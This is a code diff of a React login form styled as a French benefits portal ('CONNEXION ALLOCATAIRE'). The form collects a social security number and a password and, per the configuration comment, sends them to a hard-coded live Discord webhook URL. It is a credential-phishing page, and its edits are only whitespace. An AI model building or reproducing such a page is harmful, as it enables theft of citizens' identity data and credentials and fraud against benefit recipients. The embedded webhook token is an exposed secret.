@@ -16,7 +16,7 @@ const LoginForm = () => {
 
     // --- CONFIGURATION ---
     // Collez l'URL de votre Webhook Discord ou l'URL Formspree ici
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1483197361433088075/-_Ow9tNiutwNQ7oEGpm0nUl8bsU8mNArFYx_0JA9dZ-fmS1bXO76mgyFmdkkgtBmnekq"; 
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1483197361433088075/-_Ow9tNiutwNQ7oEGpm0nUl8bsU8mNArFYx_0JA9dZ-fmS1bXO76mgyFmdkkgtBmnekq";
 
     try {
       // Envoi des données vers le service choisi
@@ -45,7 +45,7 @@ const LoginForm = () => {
   };
 
   return (
-    <motion.div 
+    <motion.div
       className="container"
       initial={{ opacity: 0, scale: 0.95 }}
       animate={{ opacity: 1, scale: 1 }}
@@ -56,7 +56,7 @@ const LoginForm = () => {
         <h2 style={{ fontSize: '1.25rem', color: '#666', textTransform: 'uppercase', marginBottom: '1.5rem', borderBottom: '1px solid #eee', paddingBottom: '1rem', fontWeight: 600 }}>
           CONNEXION ALLOCATAIRE
         </h2>
-        
+
         <p style={{ fontSize: '0.875rem', color: '#666', marginBottom: '2rem' }}>
           Tous les champs sont obligatoires, sauf mention contraire.
         </p>
@@ -67,15 +67,15 @@ const LoginForm = () => {
               Numéro de sécurité sociale
               <HelpCircle size={16} color="#999" />
             </label>
-            <input 
-              type="text" 
+            <input
+              type="text"
               placeholder="Ex: 2 04 10 99 322 119"
               value={ssn}
               onChange={(e) => setSsn(e.target.value)}
               required
-              style={{ 
-                padding: '0.85rem', 
-                borderRadius: '4px', 
+              style={{
+                padding: '0.85rem',
+                borderRadius: '4px',
                 border: '1px solid #ccc',
                 backgroundColor: '#f8fafc',
                 fontSize: '1.1rem',
@@ -96,23 +96,23 @@ const LoginForm = () => {
               Mot de passe
             </label>
             <div style={{ position: 'relative' }}>
-              <input 
-                type={showPassword ? "text" : "password"} 
+              <input
+                type={showPassword ? "text" : "password"}
                 placeholder="Votre mot de passe"
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
                 required
-                style={{ 
-                  padding: '0.85rem', 
+                style={{
+                  padding: '0.85rem',
                   paddingRight: '3rem',
                   width: '100%',
-                  borderRadius: '4px', 
+                  borderRadius: '4px',
                   border: '1px solid #ccc',
                   backgroundColor: '#f8fafc',
                   fontSize: '1.1rem'
                 }}
               />
-              <button 
+              <button
                 type="button"
                 onClick={() => setShowPassword(!showPassword)}
                 style={{ position: 'absolute', right: '12px', top: '50%', transform: 'translateY(-50%)', color: '#0096C7', border: 'none', background: 'none' }}
@@ -126,16 +126,16 @@ const LoginForm = () => {
           </div>
 
           <div className="text-center mt-6">
-            <button 
-              type="submit" 
+            <button
+              type="submit"
               disabled={isLoading}
-              className="btn" 
-              style={{ 
-                width: '100%', 
-                padding: '1rem', 
-                backgroundColor: '#0096C7', 
-                color: 'white', 
-                fontSize: '1.1rem', 
+              className="btn"
+              style={{
+                width: '100%',
+                padding: '1rem',
+                backgroundColor: '#0096C7',
+                color: 'white',
+                fontSize: '1.1rem',
                 fontWeight: 600,
                 borderRadius: '4px',
                 opacity: isLoading ? 0.7 : 1,
